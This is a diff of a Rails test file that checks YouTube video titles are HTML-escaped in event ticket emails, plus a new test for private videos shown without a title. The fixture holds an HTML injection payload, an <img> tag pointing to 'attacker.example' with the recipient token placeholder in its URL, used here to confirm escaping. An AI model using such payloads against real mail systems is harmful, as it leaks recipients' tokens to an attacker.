@@ -367,14 +367,21 @@ class EventsTest < ActiveSupport::TestCase
 
   test 'youtube titles are escaped in emails' do
     create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
-    video = Struct.new(:title).new('<img src="https://attacker.example/x?t=%recipient.token%"> & more')
-    Yt::Video.stub(:new, video) do
+    EmailHelper.stub(:youtube_title, '<img src="https://attacker.example/x?t=%recipient.token%"> & more') do
       html = EmailHelper.rich_text(@event.extra_info_for_ticket_email)
 
       refute_match(/<img[^>]*attacker\.example/, html)
       refute_includes html, '%recipient.token%'
       assert_includes html, '&lt;img'
       assert_includes html, '&amp; more'
+    end
+  end
+
+  test 'private youtube videos are linked without a title in emails' do
+    create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
+    EmailHelper.stub(:youtube_title, nil) do
+      assert_includes EmailHelper.rich_text(@event.extra_info_for_ticket_email),
+                      '<a href="https://www.youtube.com/watch?v=abc123">link to private YouTube video</a>'
     end
   end
 
